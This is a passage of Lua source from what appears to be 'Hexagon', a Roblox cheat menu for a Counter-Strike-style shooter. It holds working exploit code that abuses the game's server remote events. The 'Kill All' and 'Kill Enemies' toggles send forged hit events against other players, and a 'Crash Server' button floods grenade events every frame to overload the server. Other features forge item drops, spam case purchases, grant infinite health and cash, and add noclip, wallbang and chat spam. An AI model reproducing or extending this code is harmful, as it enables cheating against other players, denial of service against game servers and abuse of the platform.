VisualsTabCategoryOthers:AddColorPicker("Bullet Impacts Color", Color3.new(1,0,0), "VisualsTabCategoryOthersBulletImpactsColor")

local VisualsTabCategoryViewmodelColors = VisualsTab:AddCategory("Viewmodel Colors", 2)

VisualsTabCategoryViewmodelColors:AddToggle("Enabled", false, "VisualsTabCategoryViewmodelColorsEnabled")

VisualsTabCategoryViewmodelColors:AddLabel("")
VisualsTabCategoryViewmodelColors:AddLabel("Arms")
VisualsTabCategoryViewmodelColors:AddToggle("Enabled", false, "VisualsTabCategoryViewmodelColorsArms")
VisualsTabCategoryViewmodelColors:AddColorPicker("Color", Color3.new(1,1,1), "VisualsTabCategoryViewmodelColorsArmsColor")
VisualsTabCategoryViewmodelColors:AddSlider("Transparency", {0, 1, 0, 0.01, ""}, "VisualsTabCategoryViewmodelColorsArmsTransparency")

VisualsTabCategoryViewmodelColors:AddLabel("")
VisualsTabCategoryViewmodelColors:AddLabel("Gloves")
VisualsTabCategoryViewmodelColors:AddToggle("Enabled", false, "VisualsTabCategoryViewmodelColorsGloves")
VisualsTabCategoryViewmodelColors:AddColorPicker("Color", Color3.new(1,1,1), "VisualsTabCategoryViewmodelColorsGlovesColor")
VisualsTabCategoryViewmodelColors:AddSlider("Transparency", {0, 1, 0, 0.01, ""}, "VisualsTabCategoryViewmodelColorsGlovesTransparency")

VisualsTabCategoryViewmodelColors:AddLabel("")
VisualsTabCategoryViewmodelColors:AddLabel("Sleeves")
VisualsTabCategoryViewmodelColors:AddToggle("Enabled", false, "VisualsTabCategoryViewmodelColorsSleeves")
VisualsTabCategoryViewmodelColors:AddColorPicker("Color", Color3.new(1,1,1), "VisualsTabCategoryViewmodelColorsSleevesColor")
VisualsTabCategoryViewmodelColors:AddSlider("Transparency", {0, 1, 0, 0.01, ""}, "VisualsTabCategoryViewmodelColorsSleevesTransparency")

VisualsTabCategoryViewmodelColors:AddLabel("")
VisualsTabCategoryViewmodelColors:AddLabel("Weapons")
VisualsTabCategoryViewmodelColors:AddToggle("Enabled", false, "VisualsTabCategoryViewmodelColorsWeapons")
VisualsTabCategoryViewmodelColors:AddColorPicker("Color", Color3.new(1,1,1), "VisualsTabCategoryViewmodelColorsWeaponsColor")
VisualsTabCategoryViewmodelColors:AddDropdown("Material", {"SmoothPlastic", "Neon", "ForceField", "Wood", "Glass"}, "SmoothPlastic", "VisualsTabCategoryViewmodelColorsWeaponsMaterial")
VisualsTabCategoryViewmodelColors:AddSlider("Transparency", {0, 1, 0, 0.01, ""}, "VisualsTabCategoryViewmodelColorsWeaponsTransparency")

local VisualsTabCategoryFOVCircle = VisualsTab:AddCategory("FOV Circle", 2)

VisualsTabCategoryFOVCircle:AddToggle("Enabled", false, "VisualsTabCategoryFOVCircleEnabled", function(val)
	FOVCircle.Visible = val
end)

VisualsTabCategoryFOVCircle:AddToggle("Filled", false, "VisualsTabCategoryFOVCircleFilled", function(val)
	FOVCircle.Filled = val
end)

VisualsTabCategoryFOVCircle:AddSlider("Thickness", {1, 20, 1, 1, ""}, "VisualsTabCategoryFOVCircleThickness", function(val)
	FOVCircle.Thickness = val
end)

VisualsTabCategoryFOVCircle:AddSlider("Transparency", {0, 1, 0, 0.01, ""}, "VisualsTabCategoryFOVCircleTransparency", function(val)
	FOVCircle.Transparency = 1-val
end)

VisualsTabCategoryFOVCircle:AddSlider("NumSides", {0, 30, 0, 1, ""}, "VisualsTabCategoryFOVCircleNumSides", function(val)
	FOVCircle.NumSides = val >= 3 and val or 100
end)

VisualsTabCategoryFOVCircle:AddColorPicker("Color", Color3.new(1,1,1), "VisualsTabCategoryFOVCircleColor", function(val)
	FOVCircle.Color = val
end)

local VisualsTabCategoryViewmodel = VisualsTab:AddCategory("Viewmodel", 2)

VisualsTabCategoryViewmodel:AddToggle("Enabled", false, "VisualsTabCategoryViewmodelEnabled", function(val)
	cbClient.fieldofview = (val == true and library.pointers.VisualsTabCategoryViewmodelFOV.value or 80)
	workspace.CurrentCamera.FieldOfView = (val == true and library.pointers.VisualsTabCategoryViewmodelFOV.value or 80)
end)

VisualsTabCategoryViewmodel:AddSlider("Field of View", {0, 120, 80, 1, "°"}, "VisualsTabCategoryViewmodelFOV", function(val)
	cbClient.fieldofview = (library.pointers.VisualsTabCategoryViewmodelEnabled.value == true and val or 80)
	workspace.CurrentCamera.FieldOfView = (library.pointers.VisualsTabCategoryViewmodelEnabled.value == true and val or 80)
end)

VisualsTabCategoryViewmodel:AddSlider("Viewmodel Offset X", {0, 360, 180, 1, "°"}, "VisualsTabCategoryViewmodelOffsetX")

VisualsTabCategoryViewmodel:AddSlider("Viewmodel Offset Y", {0, 360, 180, 1, "°"}, "VisualsTabCategoryViewmodelOffsetY")

VisualsTabCategoryViewmodel:AddSlider("Viewmodel Offset Z", {0, 360, 180, 1, "°"}, "VisualsTabCategoryViewmodelOffsetZ")

VisualsTabCategoryViewmodel:AddSlider("Viewmodel Offset Roll", {0, 360, 180, 1, "°"}, "VisualsTabCategoryViewmodelOffsetRoll")

VisualsTabCategoryViewmodel:AddButton("Reset", function()
    library.pointers.VisualsTabCategoryViewmodelEnabled:Set(false)
	library.pointers.VisualsTabCategoryViewmodelFOV:Set(80)
	library.pointers.VisualsTabCategoryViewmodelOffsetX:Set(180)
	library.pointers.VisualsTabCategoryViewmodelOffsetY:Set(180)
	library.pointers.VisualsTabCategoryViewmodelOffsetZ:Set(180)
	library.pointers.VisualsTabCategoryViewmodelOffsetRoll:Set(180)
end)

local VisualsTabCategoryThirdPerson = VisualsTab:AddCategory("Third Person", 2)

VisualsTabCategoryThirdPerson:AddToggle("Enabled", false, "VisualsTabCategoryThirdPersonEnabled", function(val)
	if val == true then
		game:GetService("RunService"):BindToRenderStep("ThirdPerson", 100, function()
			if LocalPlayer.CameraMinZoomDistance ~= library.pointers.VisualsTabCategoryThirdPersonDistance.value then
				LocalPlayer.CameraMinZoomDistance = library.pointers.VisualsTabCategoryThirdPersonDistance.value
				LocalPlayer.CameraMaxZoomDistance = library.pointers.VisualsTabCategoryThirdPersonDistance.value
				workspace.ThirdPerson.Value = true
			end
		end)
	else
		game:GetService("RunService"):UnbindFromRenderStep("ThirdPerson")
		if IsAlive(LocalPlayer) then
			wait()
			workspace.ThirdPerson.Value = false
			LocalPlayer.CameraMinZoomDistance = 0
			LocalPlayer.CameraMaxZoomDistance = 0
		end
	end
end)

VisualsTabCategoryThirdPerson:AddKeybind("Keybind", nil, "VisualsTabCategoryThirdPersonKeybind", function(val)
	if val == true and UserInputService:GetFocusedTextBox() == nil then
		library.pointers.VisualsTabCategoryThirdPersonEnabled:Set(not library.pointers.VisualsTabCategoryThirdPersonEnabled.value)
	end
end)

VisualsTabCategoryThirdPerson:AddSlider("Distance", {0, 50, 10, 1, ""}, "VisualsTabCategoryThirdPersonDistance")


local MiscellaneousTab = Window:CreateTab("Miscellaneous")

local MiscellaneousTabCategoryMain = MiscellaneousTab:AddCategory("Main", 1)

MiscellaneousTabCategoryMain:AddDropdown("Waypoints Teleport", {"Spawn T", "Spawn CT", "Bombsite A", "Bombsite B"}, "-", "MiscellaneousTabCategoryMainWaypointsTeleport", function(val)
	if val == "Spawn T" then
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.Map.SpawnPoints["BuyArea"].Position + Vector3.new(0, 3, 0))
		library.pointers.MiscellaneousTabCategoryMainWaypointsTeleport:Set("-")
	elseif val == "Spawn CT" then
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.Map.SpawnPoints["BuyArea2"].Position + Vector3.new(0, 3, 0))
		library.pointers.MiscellaneousTabCategoryMainWaypointsTeleport:Set("-")
	elseif val == "Bombsite A" then
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.Map.SpawnPoints["C4Plant2"].Position + Vector3.new(0, 3, 0))
		library.pointers.MiscellaneousTabCategoryMainWaypointsTeleport:Set("-")
	elseif val == "Bombsite B" then
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.Map.SpawnPoints["C4Plant"].Position + Vector3.new(0, 3, 0))
		library.pointers.MiscellaneousTabCategoryMainWaypointsTeleport:Set("-")
	end
end)

MiscellaneousTabCategoryMain:AddDropdown("Places Teleport", {"Casual", "Competitive", "Deathmatch", "Trading"}, "-", "MiscellaneousTabCategoryMainPlacesTeleport", function(val)
	if val == "Casual" then
		game:GetService("TeleportService"):Teleport(301549746, LocalPlayer)
		library.pointers.MiscellaneousTabCategoryMainPlacesTeleport:Set("-")
	elseif val == "Competitive" then
		game:GetService("TeleportService"):Teleport(1480424328, LocalPlayer)
		library.pointers.MiscellaneousTabCategoryMainPlacesTeleport:Set("-")
	elseif val == "Deathmatch" then
		game:GetService("TeleportService"):Teleport(1869597719, LocalPlayer)
		library.pointers.MiscellaneousTabCategoryMainPlacesTeleport:Set("-")
	elseif val == "Trading" then
		game:GetService("TeleportService"):Teleport(5325113759, LocalPlayer)
		library.pointers.MiscellaneousTabCategoryMainPlacesTeleport:Set("-")
	end
end)

MiscellaneousTabCategoryMain:AddDropdown("Barriers", {"Normal", "Visible", "Remove"}, "-", "MiscellaneousTabCategoryMainBarriers", function(val)
	pcall(function()
	if val ~= "-" then
		local Clips = workspace.Map.Clips; Clips.Name = "FAT"; Clips.Parent = nil
		local Killers = workspace.Map.Killers; Killers.Name = "FAT"; Killers.Parent = nil

		if val == "Normal" then	
			for i,v in pairs(Clips:GetChildren()) do
				if v:IsA("BasePart") then
					v.Transparency = 1
					v.CanCollide = true
				end
			end
			for i,v in pairs(Killers:GetChildren()) do
				if v:IsA("BasePart") then
					v.Transparency = 1
					v.CanCollide = true
				end
			end
		elseif val == "Visible" then
			for i,v in pairs(Clips:GetChildren()) do
				if v:IsA("BasePart") then
					v.Transparency = 0.9
					v.Material = "Neon"
					v.Color = Color3.fromRGB(255, 0, 255)
				end
			end
			for i,v in pairs(Killers:GetChildren()) do
				if v:IsA("BasePart") then
					v.Transparency = 0.9
					v.Material = "Neon"
					v.Color = Color3.fromRGB(255, 0, 0)
				end
			end
		elseif val == "Remove" then
			for i,v in pairs(Clips:GetChildren()) do
				if v:IsA("BasePart") then
					v:Remove()
				end
			end
			for i,v in pairs(Killers:GetChildren()) do
				if v:IsA("BasePart") then
					v:Remove()
				end
			end
		end

		Killers.Name = "Killers"; Killers.Parent = workspace.Map
		Clips.Name = "Clips"; Clips.Parent = workspace.Map
		
		library.pointers.MiscellaneousTabCategoryMainBarriers:Set("-")
	end
	end)
end)

MiscellaneousTabCategoryMain:AddDropdown("Spawn Item", Weapons, "-", "MiscellaneousTabCategoryMainSpawnItem", function(val)
	if game.ReplicatedStorage.Weapons:FindFirstChild(val) then
		game.ReplicatedStorage.Events.Drop:FireServer(
			game.ReplicatedStorage.Weapons[val],
			LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 4),
			game.ReplicatedStorage.Weapons[val].Ammo.Value,
			game.ReplicatedStorage.Weapons[val].StoredAmmo.Value,
			false,
			LocalPlayer,
			false,
			false
		)
		library.pointers.MiscellaneousTabCategoryMainSpawnItem:Set("-")
	end
end)

MiscellaneousTabCategoryMain:AddDropdown("Play Sound", TableToNames(Sounds), "-", "MiscellaneousTabCategoryMainPlaySound", function(val)
	if Sounds[val] ~= nil and Sounds[val]:IsA("Sound") then
		Sounds[val]:Play()
		library.pointers.MiscellaneousTabCategoryMainPlaySound:Set("-")
	end
end)

MiscellaneousTabCategoryMain:AddDropdown("Open Case", Cases, "-", "MiscellaneousTabCategoryMainOpenCase", function(val)
	if game.ReplicatedStorage.Cases:FindFirstChild(val) then
		for i=1,library.pointers.MiscellaneousTabCategoryMainOpenCaseAmount.value do
			game.ReplicatedStorage.Events.DataEvent:FireServer({"BuyCase", val})
		end
		library.pointers.MiscellaneousTabCategoryMainOpenCase:Set("-")
	end
end)

MiscellaneousTabCategoryMain:AddSlider("Open Case Amount", {1, 100, 1, 1, ""}, "MiscellaneousTabCategoryMainOpenCaseAmount")

local a,b = pcall(function()
	MiscellaneousTabCategoryMain:AddMultiDropdown("Custom Models", TableToNames(loadstring("return "..readfile("hexagon/custom_models.txt"))(), true), {}, "MiscellaneousTabCategoryMainCustomModels", function(val)
		if not ViewmodelsBackup then
			ViewmodelsBackup = game.ReplicatedStorage.Viewmodels:Clone()
		end
		
		game.ReplicatedStorage.Viewmodels:Destroy()
		
		ViewmodelsBackup:Clone().Parent = game.ReplicatedStorage
		
		for i,v in pairs(loadstring("return "..readfile("hexagon/custom_models.txt"))()) do
			if table.find(val, v.weaponname) then
				AddCustomModel(v)
			end
		end
	end)
end)

if not a then
	game.Players.LocalPlayer:Kick("Hexagon | Your custom models file is fucked up lol!")
end

MiscellaneousTabCategoryMain:AddDropdown("Inventory Changer", TableToNames(Inventories), "-", "MiscellaneousTabCategoryMainInventoryChanger", function(val)
	local InventoryLoadout = LocalPlayer.PlayerGui.GUI["Inventory&Loadout"]
	local InventoriesData = loadstring("return "..readfile("hexagon/inventories.txt"))()
	
	if typeof(InventoriesData[val]) == "table" then
		cbClient.CurrentInventory = InventoriesData[val]
	elseif typeof(InventoriesData[val]) == "string" then
		if InventoriesData[val] == "table_def" then
			cbClient.CurrentInventory = oldInventory
		elseif InventoriesData[val] == "table_cus" then
			cbClient.CurrentInventory = nocw_s
		elseif InventoriesData[val] == "table_all" then
			AllSkinsTable = {}

			for i,v in pairs(game.ReplicatedStorage.Skins:GetChildren()) do
				if v:IsA("Folder") and game.ReplicatedStorage.Weapons:FindFirstChild(v.Name) then
					table.insert(AllSkinsTable, {v.Name.."_Stock"})
					for i,c in pairs(v:GetChildren()) do
						if c.Name ~= "Stock" then
							table.insert(AllSkinsTable, {v.Name.."_"..c.Name})
						end
					end
				end
			end
			
			for i,v in pairs(game.ReplicatedStorage.Gloves:GetChildren()) do
				if v:FindFirstChild("Type") then
					local GloveType = (v.Type.Value == "Straps" and "Strapped Glove") or (v.Type.Value == "Wraps" and "Handwraps") or (v.Type.Value == "Sports" and "Sports Glove") or (v.Type.Value == "Fingerless" and "Fingerless Glove")
						
					if GloveType then
						table.insert(AllSkinsTable, {GloveType.."_"..v.Name})
					end
				end
			end

			cbClient.CurrentInventory = AllSkinsTable
		end
	end
	
	if InventoryLoadout.Visible == true then
		InventoryLoadout.Visible = false
		InventoryLoadout.Visible = true
	end
	
	pcall(function()
		library.pointers.MiscellaneousTabCategoryMainInventoryChanger:Refresh(TableToNames(Inventories))
	end)
end)

MiscellaneousTabCategoryMain:AddButton("Inject Custom Skins", function()
	if #nocw_s == 0 then
		for i,v in pairs(loadstring("return "..readfile("hexagon/custom_skins.txt"))()) do
			AddCustomSkin(v)
			game:GetService("RunService").Stepped:Wait()
		end
	end
end)

MiscellaneousTabCategoryMain:AddButton("Crash Server", function()
	if LocalPlayer.Character then
		game:GetService("RunService").RenderStepped:Connect(function()
			game:GetService("ReplicatedStorage").Events.ThrowGrenade:FireServer(game:GetService("ReplicatedStorage").Weapons["Molotov"].Model, nil, 25, 35, Vector3.new(0,-100,0), nil, nil)
			game:GetService("ReplicatedStorage").Events.ThrowGrenade:FireServer(game:GetService("ReplicatedStorage").Weapons["HE Grenade"].Model, nil, 25, 35, Vector3.new(0,-100,0), nil, nil)
			game:GetService("ReplicatedStorage").Events.ThrowGrenade:FireServer(game:GetService("ReplicatedStorage").Weapons["Decoy Grenade"].Model, nil, 25, 35, Vector3.new(0,-100,0), nil, nil)
			game:GetService("ReplicatedStorage").Events.ThrowGrenade:FireServer(game:GetService("ReplicatedStorage").Weapons["Smoke Grenade"].Model, nil, 25, 35, Vector3.new(0,-100,0), nil, nil)
			game:GetService("ReplicatedStorage").Events.ThrowGrenade:FireServer(game:GetService("ReplicatedStorage").Weapons["Flashbang"].Model, nil, 25, 35, Vector3.new(0,-100,0), nil, nil)
		end)
	end
end)

MiscellaneousTabCategoryMain:AddButton("Inf HP", function() pcall(function()
	game.ReplicatedStorage.Events.FallDamage:FireServer(0/0)
	LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
		LocalPlayer.Character.Humanoid.Health = 100
	end)
end) end)

MiscellaneousTabCategoryMain:AddButton("FE God", function() pcall(function()
	LocalPlayer.Character.Humanoid.Parent = nil
	Instance.new("Humanoid", LocalPlayer.Character)
end) end)

MiscellaneousTabCategoryMain:AddButton("Invisibility [dont defuse]", function() pcall(function()
	local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
	LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9999,9999,9999)
	local NewRoot = LocalPlayer.Character.LowerTorso.Root:Clone()
	LocalPlayer.Character.LowerTorso.Root:Destroy()
	NewRoot.Parent = LocalPlayer.Character.LowerTorso
	wait()
	LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
end) end)

MiscellaneousTabCategoryMain:AddButton("Vote Kick Yourself", function()
	game.ReplicatedStorage.Events.Vote:FireServer(game.Players.LocalPlayer.Name)
end)

MiscellaneousTabCategoryMain:AddToggle("Anti Vote Kick", false, "MiscellaneousTabCategoryMainAntiVoteKick")

MiscellaneousTabCategoryMain:AddToggle("Anti Spectators", false, "MiscellaneousTabCategoryMainAntiSpectators")

MiscellaneousTabCategoryMain:AddToggle("Unlock Reset Character", false, "MiscellaneousTabCategoryMainUnlockResetCharacter", function(val)
	game:GetService("StarterGui"):SetCore("ResetButtonCallback", val)
end)

MiscellaneousTabCategoryMain:AddToggle("Unlock Shop While Alive", false, "MiscellaneousTabCategoryMainUnlockShopWhileAlive")

MiscellaneousTabCategoryMain:AddToggle("Show Spectators", false, "MiscellaneousTabCategoryMainShowSpectators", function(val)
	ShowSpectators = val
	
	library.base.Spectators.Visible = val
	
	while ShowSpectators do
		for i,v in pairs(library.base.Spectators.SpectatorsFrame:GetChildren()) do
			if v:IsA("TextLabel") then
				v:Destroy()
			end
		end
		
		for i,v in pairs(GetSpectators()) do
			local SpectatorLabel = Instance.new("TextLabel")
			SpectatorLabel.BackgroundTransparency = 1
			SpectatorLabel.Size = UDim2.new(1, 0, 0, 18)
			SpectatorLabel.Text = v.Name
			SpectatorLabel.TextColor3 = Color3.new(1, 1, 1)
			SpectatorLabel.Parent = library.base.Spectators.SpectatorsFrame
		end
		
		wait(0.25)
	end
end)

MiscellaneousTabCategoryMain:AddToggle("Inf Jump", false, "MiscellaneousTabCategoryMainInfJump", function(val)
	if val == true then
		JumpHook = game:GetService("UserInputService").JumpRequest:connect(function()
			game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping") 
		end)
	elseif val == false and JumpHook then
		JumpHook:Disconnect()
	end
end)

MiscellaneousTabCategoryMain:AddToggle("Inf Cash", false, "MiscellaneousTabCategoryMainInfCash", function(val)
	if val == true then
		LocalPlayer.Cash.Value = 16000
		CashHook = LocalPlayer.Cash:GetPropertyChangedSignal("Value"):connect(function()
			LocalPlayer.Cash.Value = 16000
		end)
	elseif val == false and CashHook then
		CashHook:Disconnect()
	end
end)

MiscellaneousTabCategoryMain:AddToggle("Inf Stamina", false, "MiscellaneousTabCategoryMainInfStamina", function(val)
	if val == true then
		game:GetService("RunService"):BindToRenderStep("Stamina", 100, function()
			if cbClient.crouchcooldown ~= 0 then
				cbClient.crouchcooldown = 0
			end
		end)
	elseif val == false then
		game:GetService("RunService"):UnbindFromRenderStep("Stamina")
	end
end)

MiscellaneousTabCategoryMain:AddToggle("NNS Dont Talk", false, "MiscellaneousTabCategoryMainNNSDontTalk")

MiscellaneousTabCategoryMain:AddToggle("No Chat Filter", false, "MiscellaneousTabCategoryMainNoChatFilter")

MiscellaneousTabCategoryMain:AddToggle("No Fall Damage", false, "MiscellaneousTabCategoryMainNoFallDamage")

MiscellaneousTabCategoryMain:AddToggle("No Fire Damage", false, "MiscellaneousTabCategoryMainNoFireDamage")

MiscellaneousTabCategoryMain:AddToggle("Kill All", false, "MiscellaneousTabCategoryMainKillAll", function(val)
	if val == true then
		KillAllLoop = game:GetService("RunService").RenderStepped:Connect(function()
			wait()
			pcall(function()
				for i,v in pairs(game.Players:GetChildren()) do
					if v ~= LocalPlayer and IsAlive(v) and IsAlive(LocalPlayer) then
						local Arguments = {
							[1] = v.Character.Head,
							[2] = v.Character.Head.Position,
							[3] = "Banana",
							[4] = 100,
							[5] = LocalPlayer.Character.Gun,
							[8] = 100,
							[9] = false,
							[10] = false,
							[11] = Vector3.new(),
							[12] = 100,
							[13] = Vector3.new()
						}
						game.ReplicatedStorage.Events.HitPart:FireServer(unpack(Arguments))
					end
				end
			end)
		end)
	elseif val == false and KillAllLoop then
		KillAllLoop:Disconnect()
	end
end)

MiscellaneousTabCategoryMain:AddToggle("Kill Enemies", false, "MiscellaneousTabCategoryMainKillEnemies", function(val)
	if val == true then
		KillEnemiesLoop = game:GetService("RunService").RenderStepped:Connect(function()
			pcall(function()
				for i,v in pairs(game.Players:GetChildren()) do
					if v ~= LocalPlayer and IsAlive(v) and IsAlive(LocalPlayer) and GetTeam(v) ~= GetTeam(LocalPlayer) then
						local Arguments = {
							[1] = v.Character.Head,
							[2] = v.Character.Head.Position,
							[3] = "Banana",
							[4] = 100,
							[5] = LocalPlayer.Character.Gun,
							[8] = 100,
							[9] = false,
							[10] = false,
							[11] = Vector3.new(),
							[12] = 100,
							[13] = Vector3.new()
						}
						game.ReplicatedStorage.Events.HitPart:FireServer(unpack(Arguments))
					end
				end
			end)
		end)
	elseif val == false and KillEnemiesLoop then
		KillEnemiesLoop:Disconnect()
	end
end)

MiscellaneousTabCategoryMain:AddTextBox("Hit Sound", "", "MiscellaneousTabCategoryMainHitSound")

MiscellaneousTabCategoryMain:AddTextBox("Kill Sound", "", "MiscellaneousTabCategoryMainKillSound")

local MiscellaneousTabCategoryNoclip = MiscellaneousTab:AddCategory("Noclip", 1)

MiscellaneousTabCategoryNoclip:AddToggle("Enabled", false, "MiscellaneousTabCategoryNoclipEnabled", function(val)
	if val == true then
		FlyLoop = game:GetService("RunService").Stepped:Connect(function()
			if IsAlive(LocalPlayer) then
				spawn(function()
					pcall(function()
						local speed = library.pointers.MiscellaneousTabCategoryNoclipSpeed.value
						local velocity = Vector3.new(0, 1, 0)
						
						if UserInputService:IsKeyDown(Enum.KeyCode.W) then
							velocity = velocity + (workspace.CurrentCamera.CoordinateFrame.lookVector * speed)
						end
						if UserInputService:IsKeyDown(Enum.KeyCode.A) then
							velocity = velocity + (workspace.CurrentCamera.CoordinateFrame.rightVector * -speed)
						end
						if UserInputService:IsKeyDown(Enum.KeyCode.S) then
							velocity = velocity + (workspace.CurrentCamera.CoordinateFrame.lookVector * -speed)
						end
						if UserInputService:IsKeyDown(Enum.KeyCode.D) then
							velocity = velocity + (workspace.CurrentCamera.CoordinateFrame.rightVector * speed)
						end
						
						LocalPlayer.Character.HumanoidRootPart.Velocity = velocity
						LocalPlayer.Character.Humanoid.PlatformStand = true
					end)
				end)
			end
		end)
		
		NoclipLoop = game:GetService("RunService").Stepped:Connect(function()
			for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
				if v:IsA("BasePart") and v.CanCollide == true then
					v.CanCollide = false
				end
			end
		end)
	elseif val == false and FlyLoop and NoclipLoop then
		pcall(function()
			FlyLoop:Disconnect()
			NoclipLoop:Disconnect()
			LocalPlayer.Character.Humanoid.PlatformStand = false
		end)
	end
end)

MiscellaneousTabCategoryNoclip:AddKeybind("Keybind", nil, "MiscellaneousTabCategoryNoclipKeybind", function(val)
	if val == true and UserInputService:GetFocusedTextBox() == nil then
		library.pointers.MiscellaneousTabCategoryNoclipEnabled:Set(not library.pointers.MiscellaneousTabCategoryNoclipEnabled.value)
	end
end)

MiscellaneousTabCategoryNoclip:AddSlider("Speed", {0, 100, 16, 1, ""}, "MiscellaneousTabCategoryNoclipSpeed")

local MiscellaneousTabCategoryGunMods = MiscellaneousTab:AddCategory("Gun Mods", 2)

MiscellaneousTabCategoryGunMods:AddSlider("Damage Multiplier", {0, 100, 1, 0.01, "x"}, "MiscellaneousTabCategoryGunModsDamageMultiplier")

MiscellaneousTabCategoryGunMods:AddToggle("Wallbang", false, "MiscellaneousTabCategoryGunModsWallbang")

MiscellaneousTabCategoryGunMods:AddToggle("No Recoil", false, "MiscellaneousTabCategoryGunModsNoRecoil", function(val)
	if val == true then
		game:GetService("RunService"):BindToRenderStep("NoRecoil", 100, function()
			cbClient.resetaccuracy()
			cbClient.RecoilX = 0
			cbClient.RecoilY = 0
		end)
	elseif val == false then
		game:GetService("RunService"):UnbindFromRenderStep("NoRecoil")
	end
end)

MiscellaneousTabCategoryGunMods:AddToggle("No Spread", false, "MiscellaneousTabCategoryGunModsNoSpread")

MiscellaneousTabCategoryGunMods:AddToggle("Rapid Fire", false, "MiscellaneousTabCategoryGunModsRapidFire")

MiscellaneousTabCategoryGunMods:AddToggle("Full Auto", false, "MiscellaneousTabCategoryGunModsFullAuto")

MiscellaneousTabCategoryGunMods:AddToggle("Instant Reload", false, "MiscellaneousTabCategoryGunModsInstantReload")

MiscellaneousTabCategoryGunMods:AddToggle("Instant Equip", false, "MiscellaneousTabCategoryGunModsInstantEquip")

MiscellaneousTabCategoryGunMods:AddToggle("Infinite Ammo", false, "MiscellaneousTabCategoryGunModsInfiniteAmmo")

MiscellaneousTabCategoryGunMods:AddToggle("Infinite Range", false, "MiscellaneousTabCategoryGunModsInfiniteRange")

MiscellaneousTabCategoryGunMods:AddToggle("Infinite Penetration", false, "MiscellaneousTabCategoryGunModsInfinitePenetration")

-- MiscellaneousTabCategoryGunMods:AddSlider("Recoil", {0, 100, 100, 1, "%"}, "MiscellaneousTabCategoryGunModsRecoil")

MiscellaneousTabCategoryGunMods:AddDropdown("Plant", {"Normal", "Instant", "Anywhere"}, "Normal", "MiscellaneousTabCategoryGunModsPlant")

MiscellaneousTabCategoryGunMods:AddDropdown("Defuse", {"Normal", "Instant", "Anywhere"}, "Normal", "MiscellaneousTabCategoryGunModsDefuse")

MiscellaneousTabCategoryGunMods:AddButton("Plant C4", PlantC4)

MiscellaneousTabCategoryGunMods:AddButton("Defuse C4", DefuseC4)

local MiscellaneousTabCategoryBunnyHop = MiscellaneousTab:AddCategory("Bunny Hop", 2)

MiscellaneousTabCategoryBunnyHop:AddToggle("Enabled", false, "MiscellaneousTabCategoryBunnyHopEnabled")

MiscellaneousTabCategoryBunnyHop:AddSlider("Acceleration", {0, 100, 3, 1, ""}, "MiscellaneousTabCategoryBunnyHopAcceleration")

MiscellaneousTabCategoryBunnyHop:AddSlider("Minimum Velocity", {0, 100, 16, 1, ""}, "MiscellaneousTabCategoryBunnyHopMinVelocity")

MiscellaneousTabCategoryBunnyHop:AddSlider("Maximum Velocity", {0, 100, 40, 1, ""}, "MiscellaneousTabCategoryBunnyHopMaxVelocity")

local MiscellaneousTabCategoryBacktrack = MiscellaneousTab:AddCategory("Backtrack", 2)

MiscellaneousTabCategoryBacktrack:AddToggle("Enabled", false, "MiscellaneousTabCategoryBacktrackEnabled", function(val)
	if val == true then
		Backtracking = RunService.RenderStepped:Connect(function()
			if IsAlive(LocalPlayer) then
				for i,v in pairs(game.Players:GetPlayers()) do
					if IsAlive(v) and GetTeam(v) ~= GetTeam(LocalPlayer) then
						local NewBacktrackPart = Instance.new("Part")
						NewBacktrackPart.Name = v.Name
						NewBacktrackPart.Anchored = true
						NewBacktrackPart.CanCollide = false
						NewBacktrackPart.Transparency = library.pointers.MiscellaneousTabCategoryBacktrackTransparency.value
						NewBacktrackPart.Color = library.pointers.MiscellaneousTabCategoryBacktrackColor.value
						NewBacktrackPart.Size = v.Character.Head.Size
						NewBacktrackPart.CFrame = v.Character.Head.CFrame
						NewBacktrackPart.Parent = HexagonFolder
						
						local BacktrackTag = Instance.new("ObjectValue")
						BacktrackTag.Parent = NewBacktrackPart
						BacktrackTag.Name = "PlayerName"
						BacktrackTag.Value = v
						
						spawn(function()
							wait(library.pointers.MiscellaneousTabCategoryBacktrackTime.value/1000)
							NewBacktrackPart:Destroy()
						end)
					end
				end
			end
		end)
	elseif val == false and Backtracking then
		Backtracking:Disconnect()
	end
end)

MiscellaneousTabCategoryBacktrack:AddSlider("Time", {0, 1000, 200, 1, "ms"}, "MiscellaneousTabCategoryBacktrackTime")

MiscellaneousTabCategoryBacktrack:AddSlider("Transparency", {0, 1, 0, 0.01, ""}, "MiscellaneousTabCategoryBacktrackTransparency")

MiscellaneousTabCategoryBacktrack:AddColorPicker("Color", Color3.new(1,1,1), "MiscellaneousTabCategoryBacktrackColor")

local MiscellaneousTabCategoryGrenade = MiscellaneousTab:AddCategory("Grenade", 2)

MiscellaneousTabCategoryGrenade:AddKeybind("Keybind", nil, "MiscellaneousTabCategoryGrenadeKeybind", function(val)
	if val == true and UserInputService:GetFocusedTextBox() == nil then
		game:GetService("ReplicatedStorage").Events.ThrowGrenade:FireServer(
			game.ReplicatedStorage.Weapons[library.pointers.MiscellaneousTabCategoryGrenadeType.value].Model,
			nil,
			25,
			35,
			(game.Players.LocalPlayer:GetMouse().Hit.Position - game.Players.LocalPlayer.Character.Head.Position) * library.pointers.MiscellaneousTabCategoryGrenadeVelocity.value,
			nil,
			nil
		)
	end
end)

MiscellaneousTabCategoryGrenade:AddSlider("Velocity", {0, 100, 10, 1, ""}, "MiscellaneousTabCategoryGrenadeVelocity")

MiscellaneousTabCategoryGrenade:AddDropdown("Type", {"Molotov","HE Grenade","Decoy Grenade","Smoke Grenade","Incendiary Grenade","Flashbang"}, "Molotov", "MiscellaneousTabCategoryGrenadeType")

local MiscellaneousTabCategoryChatSpam = MiscellaneousTab:AddCategory("Chat Spam", 2)

MiscellaneousTabCategoryChatSpam:AddToggle("Enabled", false, "MiscellaneousTabCategoryChatSpamEnabled", function(val)
	ChatSpam = val
	
